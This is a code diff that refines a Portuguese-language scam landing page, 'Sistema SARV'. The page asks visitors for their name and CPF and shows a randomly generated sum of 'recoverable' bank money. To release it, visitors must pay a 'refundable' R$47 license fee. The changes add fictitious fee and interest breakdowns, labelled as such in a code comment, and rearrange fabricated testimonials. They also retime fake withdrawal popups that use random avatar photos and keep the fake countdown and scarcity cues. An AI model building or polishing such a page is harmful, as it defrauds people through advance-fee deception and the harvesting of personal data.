@@ -20,7 +20,9 @@
 
         .top-alert { background: #f59e0b; color: #000; padding: 12px; text-align: center; font-size: 11px; font-weight: 800; text-transform: uppercase; z-index: 999; position: relative; border-bottom: 1px solid #d97706; }
         .navbar { background: var(--primary); padding: 15px; border-bottom: 2px solid #003070; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .logo { font-weight: 900; color: #fff; font-size: 18px; display: flex; align-items: center; gap: 5px; }
+        .logo-container { display: flex; flex-direction: column; color: #fff; }
+        .logo { font-weight: 900; font-size: 18px; display: flex; align-items: center; gap: 5px; }
+        .sub-logo { font-size: 9px; font-weight: 700; text-transform: uppercase; opacity: 0.9; margin-left: 28px; margin-top: -2px; }
         .status-online { color: #fff; font-size: 10px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
         .dot { width: 8px; height: 8px; background: #00ff41; border-radius: 50%; animation: pulse 1s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
@@ -76,6 +78,11 @@
         .result-card { background: #f0fff4; border: 2px dashed var(--secondary); padding: 30px 20px; border-radius: 20px; margin: 15px 0; text-align: center; }
         .result-card h3 { font-size: 44px; font-weight: 900; color: #111; }
         
+        .audit-details { background: #f8fafc; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: left; border: 1px solid #e2e8f0; }
+        .audit-line { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; font-weight: 600; }
+        .audit-line span { color: #64748b; }
+        .audit-line b { color: #1e293b; }
+
         .footer { text-align: center; padding: 40px 20px; font-size: 11px; color: #999; border-top: 1px solid #ddd; line-height: 1.6; }
     </style>
 </head>
@@ -84,7 +91,10 @@
     <div class="top-alert">⚠️ Liberação extraordinária — Sistema disponível APENAS HOJE (11 de maio de 2026)</div>
 
     <nav class="navbar">
-        <div class="logo">🛡️ Sistema SARV</div>
+        <div class="logo-container">
+            <div class="logo">🛡️ Sistema SARV</div>
+            <div class="sub-logo">auditoria de valores bancários</div>
+        </div>
         <div class="status-online"><div class="dot"></div> ONLINE</div>
     </nav>
 
@@ -144,24 +154,9 @@
                     <div class="val-rec">+R$ 3.120,00</div>
                     <p class="depo-text">"Trabalhei 40 anos de carteira assinada. O scanner achou R$ 3.120,00 que tava parado. Caiu no PIX em 12 minutos como prometido."</p>
                 </div>
-                <div class="card-depo">
-                    <div class="depo-header"><b>Marcos Oliveira, 45 anos</b> <span>Osasco - SP</span></div>
-                    <div class="val-rec">+R$ 1.890,00</div>
-                    <p class="depo-text">"Paguei a licença e o valor caiu na hora. O estorno dos 97 reais veio junto no mesmo PIX. Vale a pena."</p>
-                </div>
-                <div class="card-depo">
-                    <div class="depo-header"><b>Fernanda Souza, 38 anos</b> <span>Curitiba - PR</span></div>
-                    <div class="val-rec">+R$ 2.765,00</div>
-                    <p class="depo-text">"Sistema muito fácil de usar. Achei dinheiro de uma conta que fechei em 2018. Muito obrigada!"</p>
-                </div>
-                <div class="card-depo">
-                    <div class="depo-header"><b>Ricardo Mendes, 54 anos</b> <span>Vitória - ES</span></div>
-                    <div class="val-rec">+R$ 1.250,00</div>
-                    <p class="depo-text">"Acabei de receber. O processo é rápido e o suporte no WhatsApp me ajudou com a chave pix. Recomendo."</p>
-                </div>
             </div>
 
-            <button class="btn-more" onclick="alert('Carregando depoimentos antigos de 2025...')">Ver comentários mais antigos</button>
+            <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
 
             <div class="steps">
                 <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
@@ -218,16 +213,23 @@
                     <h3 id="f-money">R$ 0,00</h3>
                 </div>
 
+                <div class="audit-details">
+                    <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
+                    <div class="audit-line"><span>Tarifas Indevidas Localizadas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
+                    <div class="audit-line"><span>Juros de Contas Inativas:</span> <b>R$ <span id="val-juros"></span></b></div>
+                    <div class="audit-line"><span>Status do Saque:</span> <b style="color:var(--secondary)">LIBERADO</b></div>
+                </div>
+
                 <h3 style="color: #ff0000; font-size: 18px; font-weight: 900; text-align: center; margin-bottom: 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
                 
                 <div style="font-size: 15px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
                     <span class="u-nome" style="font-weight: 800;"></span>, para garantir que o saque seja feito pelo titular do CPF e evitar fraudes, é necessário ativar sua <b>Licença de Auditoria Individual</b>.<br><br>
-                    <b>IMPORTANTE:</b> O valor da licença de R$ 97,00 é <u>100% REEMBOLSÁVEL</u> e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
+                    <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é <u>100% REEMBOLSÁVEL</u> e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
                 </div>
 
                 <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
-                    <span style="font-size: 12px; color: #999; text-decoration: line-through;">De R$ 297,00</span>
-                    <div style="font-size: 38px; font-weight: 900; color: var(--secondary);">R$ 97,00</div>
+                    <span style="font-size: 12px; color: #999; text-decoration: line-through;">De R$ 97,00</span>
+                    <div style="font-size: 38px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
                     <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
                         <div><span style="display:block; font-size: 10px; color: #999;">Encerra em</span><b style="color:#ff0000" id="timer">05:00</b></div>
                         <div><span style="display:block; font-size: 10px; color: #999;">Vagas hoje</span><b>2</b></div>
@@ -238,7 +240,7 @@
 
                 <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--primary);">
                      <p style="font-size: 14px; color: #111; line-height: 1.6; font-weight: 600;">
-                        <b>Recado do Roberto:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 97 reais devolvidos no mesmo PIX. É o seu direito."
+                        <b>Recado do Roberto:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. É o seu direito."
                     </p>
                 </div>
             </div>
@@ -266,28 +268,48 @@
             e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         });
 
-        const users = [
+        const usersPop = [
             {n: "Ricardo M.", c: "São Paulo", g: "m"},
             {n: "Maria Eduarda", c: "Curitiba", g: "f"},
             {n: "José Silva", c: "Belo Horizonte", g: "m"},
             {n: "Luciana P.", c: "Rio de Janeiro", g: "f"},
-            {n: "Marcos O.", c: "Fortaleza", g: "m"},
+            {n: "Marcos O.", c: "Osasco", g: "m"},
             {n: "Fernanda G.", c: "Manaus", g: "f"},
             {n: "Sérgio R.", c: "Porto Alegre", g: "m"}
         ];
         
         function showNotification() {
-            const user = users[Math.floor(Math.random() * users.length)];
+            const user = usersPop[Math.floor(Math.random() * usersPop.length)];
             const val = (Math.random() * (3256 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2});
             document.getElementById('notif-name').innerText = `${user.n} de ${user.c}`;
             document.getElementById('notif-val').innerText = `Acabou de sacar R$ ${val} via PIX`;
-            const seed = user.g === "m" ? "male" : "female";
-            document.getElementById('notif-img').src = `https://xsgames.co/randomusers/avatar.php?g=${seed}&sig=${Math.random()}`;
+            
+            // Foto casada com o gênero do nome
+            const gender = user.g === "m" ? "male" : "female";
+            document.getElementById('notif-img').src = `https://xsgames.co/randomusers/avatar.php?g=${gender}&sig=${Math.random()}`;
+            
             const box = document.getElementById('notification-box');
             box.classList.add('show');
             setTimeout(() => box.classList.remove('show'), 4000);
         }
-        setInterval(showNotification, 12000);
+        // Tempo aumentado para 18 segundos para não poluir
+        setInterval(showNotification, 18000);
+
+        function loadMoreDepos() {
+            const container = document.getElementById('depo-container');
+            const novos = [
+                {n: "Marcos Oliveira, 45 anos", l: "Osasco - SP", v: "1.890,00", t: "Paguei a licença de 47 e o valor caiu na hora. O estorno veio junto no mesmo PIX. Vale a pena."},
+                {n: "Fernanda Souza, 38 anos", l: "Curitiba - PR", v: "2.765,00", t: "Sistema muito fácil de usar. Achei dinheiro de uma conta que fechei em 2018. Muito obrigada!"},
+                {n: "Ricardo Mendes, 54 anos", l: "Vitória - ES", v: "1.250,00", t: "Acabei de receber. O processo é rápido e o suporte no WhatsApp me ajudou com a chave pix. Recomendo."}
+            ];
+            novos.forEach(d => {
+                const div = document.createElement('div');
+                div.className = 'card-depo';
+                div.innerHTML = `<div class="depo-header"><b>${d.n}</b> <span>${d.l}</span></div><div class="val-rec">+R$ ${d.v}</div><p class="depo-text">"${d.t}"</p>`;
+                container.appendChild(div);
+            });
+            document.getElementById('btn-load-more').style.display = 'none';
+        }
 
         function startScanner() {
             const nome = document.getElementById('nome').value;
@@ -317,7 +339,13 @@
 
         function showResult() {
             const min = 1100; const max = 3256;
-            const sorteio = (Math.random() * (max - min) + min).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            const total = Math.random() * (max - min) + min;
+            const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            
+            // Cálculos fictícios para o bloco de auditoria
+            document.getElementById('val-tarifas').innerText = (total * 0.6).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            document.getElementById('val-juros').innerText = (total * 0.4).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            
             document.getElementById('f-money').innerText = "R$ " + sorteio;
             document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
             document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
